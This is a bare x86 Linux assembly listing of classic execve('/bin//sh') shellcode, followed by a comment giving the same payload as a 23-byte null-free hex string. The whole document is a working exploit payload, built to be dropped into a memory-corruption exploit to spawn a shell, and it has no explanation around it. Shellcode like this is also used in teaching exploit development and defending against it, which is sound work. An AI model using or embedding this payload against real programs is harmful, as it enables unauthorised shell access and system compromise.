section .text
    global _start

_start:
    xor eax, eax
    xor ecx, ecx
    xor edx, edx

    push eax
    push 0x68732f2f
    push 0x6e69622f

    mov ebx, esp
    mov al, 0xb
    int 0x80

; \x31\xc0\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
; 23 bytes
